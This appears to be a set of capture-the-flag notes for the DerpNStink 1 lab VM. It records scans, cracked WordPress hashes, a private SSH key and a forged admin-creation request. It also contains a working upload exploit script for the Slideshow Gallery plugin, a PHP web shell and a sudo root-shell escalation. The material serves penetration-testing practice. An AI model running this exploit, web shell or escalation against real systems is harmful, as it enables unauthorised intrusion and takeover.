https://hackso.me/derpnstink-1-walkthrough/


Available information:

Kernel version: 4.4.0
Architecture: i686
Distribution: ubuntu
Distribution version: 14.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS




└─$ sudo nmap -sT -A -T4 -Pn -n  -p- 10.0.1.10
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 14:28 CEST
Nmap scan report for 10.0.1.10
Host is up (0.0011s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
MAC Address: 08:00:27:9C:D8:6C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.11 ms 10.0.1.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.15 seconds



└─$ wpscan --url http://derpnstink.local/weblog/ -e u            

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] unclestinky
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)


[!] Valid Combinations Found:
 | Username: admin, Password: admin




└─$ curl http://derpnstink.local


<--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) -->



└─$ curl http://derpnstink.local/webnotes/info.txt
<-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live --> 
 


http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/php-reverse-shell.php




└─$ curl http://derpnstink.local/webnotes/
[stinky@DeRPnStiNK /var/www/html ]$ whois derpnstink.local
   Domain Name: derpnstink.local
   Registry Domain ID: 2125161577_DOMAIN_COM-VRSN
   Registrar WHOIS Server: whois.fakehosting.com
   Registrar URL: http://www.fakehosting.com
   Updated Date: 2017-11-12T16:13:16Z
   Creation Date: 2017-11-12T16:13:16Z
   Registry Expiry Date: 2017-11-12T16:13:16Z
   Registrar: fakehosting, LLC
   Registrar IANA ID: 1337
   Registrar Abuse Contact Email: stinky@derpnstink.local
   Registrar Abuse Contact Phone:
   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited

ls -al /home
total 16
drwxr-xr-x  4 root   root   4096 Nov 12  2017 .
drwxr-xr-x 23 root   root   4096 Nov 12  2017 ..
drwx------ 10 mrderp mrderp 4096 Jan  9  2018 mrderp
drwx------ 12 stinky stinky 4096 Jan  9  2018 stinky

www-data@DeRPnStiNK:/tmp$ uname -a
uname -a
Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux

mysql> select user_login, user_pass from wp_users;
select user_login, user_pass from wp_users;
+-------------+------------------------------------+
| user_login  | user_pass                          |
+-------------+------------------------------------+
| unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 |
| admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ |
+-------------+------------------------------------+

└─$ john key --wordlist=/usr/share/wordlists/rockyou.txt                               1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
wedgie57         (?)
1g 0:00:00:39 DONE (2021-04-09 23:32) 0.02525g/s 70631p/s 70631c/s 70631C/s wee1994....wedders1234
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed
                                                                                           
┌──(kali㉿kali)-[~/OSCP/boxes/DeRPnStiNK]
└─$ john key --show                                     
?:wedgie57




-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
-----END RSA PRIVATE KEY-----




action=createuser&_wpnonce_create-user=b250402af6&_wp_http_referer=%2Fweblog%2Fwp-admin%2Fuser-new.php&
user_login=mrderp&email=mrderp%40derpnstink.local&first_name=mr&last_name=derp&url=%2Fhome%2Fmrderp&
pass1=derpderpderpderpderpderpderp&pass1-text=derpderpderpderpderpderpderp&pass2=derpderpderpderpderpderpderp&pw_weak=on&role=administrator&createuser=Add+New+UserHTTP/1.1 302 Found


root@DeRPnStiNK:/root# find / -type f -name "flag.*" 2>/dev/null
/home/stinky/Desktop/flag.txt
/usr/src/linux-headers-4.4.0-31-generic/include/config/zone/dma/flag.h
/usr/share/help/C/gnome-mines/figures/flag.svg
/usr/share/gnome-mines/flag.svg
/root/Desktop/flag.txt



= Plus

#!/bin/bash

HOST=derpnstink.local
BLOG=weblog
USER=admin
PASS=$USER
VULN="wp-admin/admin.php?page=slideshow-slides&method=save"
FILE=$1

# authenticate
curl \
    -s \
    -c cookie \
    -d "log=$USER&pwd=$PASS&wp-submit=Log" \
    http://$HOST/$BLOG/wp-login.php

# exploit
curl \
    -s \
    -b cookie \
    -H "Expect:" \
    -o /dev/null \
    -F "Slide[id]=" \
    -F "Slide[order]=" \
    -F "Slide[title]=$(mktemp -u | sed -r 's/^.*tmp\.(.*)$/\1/')" \
    -F "Slide[description]=" \
    -F "Slide[showinfo]=both" \
    -F "Slide[iopacity]=70" \
    -F "Slide[galleries][]=1" \
    -F "Slide[type]=file" \
    -F "image_file=@$FILE;filename=$FILE;type=application/octet-stream" \
    -F "Slide[image_url]=" \
    -F "Slide[uselink]=N" \
    -F "Slide[link]=" \
    -F "Slide[linktarget]=self" \
    -F "submit=Save Slide" \
    http://$HOST/$BLOG/$VULN

# cleanup
rm -rf cookie



# cat cmd.php
<pre><?php echo shell_exec($_GET['cmd']);?></pre>

# ./upload.sh cmd.php


$ tcpdump -nt -r derpissues.pcap -A 2>/dev/null | grep -P 'pwd='

$ mkdir -p /home/mrderp/binaries
$ echo -e '#!/usr/bin/env python\nimport os\nos.setuid(0)\nos.setgid(0)\nos.system("/bin/bash")' > /home/mrderp/binaries/derpy
$ chmod +x /home/mrderp/binaries/derpy
$ sudo /home/mrderp/binaries/derpy